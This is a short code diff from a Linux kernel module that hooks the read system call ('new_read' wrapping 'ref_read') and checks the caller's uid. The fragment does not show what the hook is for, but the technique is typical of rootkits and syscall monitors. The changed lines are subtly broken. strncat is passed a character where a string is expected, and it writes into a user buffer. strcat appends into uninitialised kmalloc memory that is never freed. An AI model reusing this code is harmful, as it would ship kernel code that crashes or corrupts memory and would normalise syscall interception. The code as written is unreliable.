@@ -17,7 +17,8 @@ static int getuid(void){
 
 //Read
 asmlinkage long new_read(unsigned int fd, char __user *buf, size_t count){
-	char *newBuf = (char *)strncat((const char*)buf,'\0',1);
+	char *newBuf = kmalloc((count+1) * sizeof(char),GFP_KERNEL);
+	strcat(newBuf,strncat(buf,'\0',1));
 	
 	int uid = getuid();
 	size_t readreturn = (*ref_read)(fd,newBuf,count);
